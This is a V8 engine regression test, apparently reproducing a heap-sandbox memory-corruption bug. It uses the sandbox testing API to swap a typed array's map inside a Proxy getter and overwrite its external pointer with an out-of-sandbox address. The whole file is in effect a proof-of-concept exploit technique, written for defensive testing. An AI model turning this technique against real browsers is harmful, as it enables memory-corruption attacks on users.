// Copyright 2025 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

const kHeapObjectTag = 1;
const kSandboxedPointerShift = 24n;
const kMaxSafeBufferSizeForSandbox = 32 * 1024 * 1024 * 1024 - 1;
const kMapOffset = 0;
const kBackingStoreOffset = 36;
const kExternalPointerOffset = 48;
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const getPtr = (obj) => Sandbox.getAddressOf(obj) + kHeapObjectTag;
const getField = (obj, offset) => memory.getUint32(getPtr(obj) + offset - kHeapObjectTag, true);
const setField = (obj, offset, value) => memory.setUint32(getPtr(obj) + offset - kHeapObjectTag, value, true);
const setField64 = (obj, offset, value) => memory.setBigUint64(getPtr(obj) + offset - kHeapObjectTag, value, true);
const arrayBuffer = new ArrayBuffer(kMaxSafeBufferSizeForSandbox);
const dest = new Uint8Array(arrayBuffer);
const uint8ArrayMap = getField(dest, kMapOffset);
const u64s = new BigUint64Array(0);
const bigUint64ArrayMap = getField(u64s, kMapOffset);
dest.set(new Proxy({}, {
  get(_, name) {
    if (name === "length") {
      setField(dest, kMapOffset, bigUint64ArrayMap);
      return 1;
    }
    setField(dest, kMapOffset, uint8ArrayMap);
    setField64(dest, kExternalPointerOffset, 0xffffffffffn << kSandboxedPointerShift);
    return 0x4141414141414141n;
  }
}), kMaxSafeBufferSizeForSandbox - 1);
